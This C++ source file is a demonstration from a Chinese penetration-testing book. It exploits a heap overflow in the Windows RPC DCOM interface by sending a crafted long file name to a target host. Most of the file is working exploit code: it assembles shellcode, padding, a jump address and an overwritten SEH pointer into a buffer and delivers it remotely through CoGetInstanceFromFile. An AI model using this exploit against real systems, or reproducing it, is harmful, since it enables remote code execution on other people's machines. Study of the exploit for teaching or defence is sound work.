/* rpc_heap.cpp
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  Windows RPC DCOM接口长文件名堆溢出利用程序
*/

#define _WIN32_DCOM
#include <iostream.h>
#include <ocidl.h>
#include <rpc.h>
#include <rpcdce.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>

#pragma comment(lib,"ole32")

const CLSID CLSID_MiniDcom = {0x0c658741,0x3b20,0xb692,{0x7c,0x46,0xac,0xe4,0xd8,0x52,0xbe,0x46}};

#include "replace_heap_shellcode.c"

interface IDouble
{
	CONST_VTBL struct IDoubleVtbl __RPC_FAR *lpVtbl;
};

// 跳过\\localhost\C$\的双字节，jmp_addr被覆盖到第二个\，所以跳过0x1e-2
unsigned char jmp_addr[] = "\xEB\x1C\xEB\x1C";
unsigned char top_seh[]  = "\xB4\x73\xEB\x77";

void main(int argc,char ** argv)
{
	char *szHost;

	if(argc<=1)
	{
		printf("usage: %s <Target> \n",argv[0]);
		exit(0);
	}else 
	{
		szHost = argv[1];
	
	}

	CoInitializeEx(NULL, COINIT_MULTITHREADED);
	IUnknown* pUnknown = 0;
	IDouble* pDouble = 0;
	COSERVERINFO si;
	WCHAR wcsHost[64];
	size_t t = mbstowcs( wcsHost, szHost, 64 );
	ZeroMemory(&si, sizeof(si));
	si.pwszName = wcsHost;

	MULTI_QI rgmqi[1];
	ZeroMemory(rgmqi, sizeof(rgmqi));
	rgmqi[0].pIID = &IID_IUnknown;

	wchar_t longname[65535]={0};
	wcscat(longname, L"\\\\localhost\\C$\\");
	
    // 计算shellcode
    GetShellCode();
    
    if (sh_Len == 0 || sh_Len > 528)
    {
        printf("[-] ShellCode size error.\n");
        return;
    }

    PrintSc(sh_Buff, sh_Len);

    memcpy(&(longname[wcslen(longname)]), sh_Buff, sh_Len);
    if (sh_Len%2)
    {
        sh_Len++;
    }

	memset(&(longname[wcslen(longname)]), 'A', 528-sh_Len);
	
	memcpy(&(longname[wcslen(longname)]), jmp_addr, sizeof(jmp_addr));
	memcpy(&(longname[wcslen(longname)]), top_seh , sizeof(top_seh));

    // 填充，为了使堆大于1024字节，那么在释放的时候能走入我们的流程
	memset(&(longname[wcslen(longname)]), 'A', 1024-wcslen(longname));
	
	HRESULT ret = CoGetInstanceFromFile (
                                         &si,
                                         (_GUID*)&CLSID_MiniDcom,
                                         NULL,
                                         CLSCTX_REMOTE_SERVER,
                                         STGM_READWRITE,
                                         (OLECHAR*)longname,
                                         1,
                                         rgmqi
                                        );
}
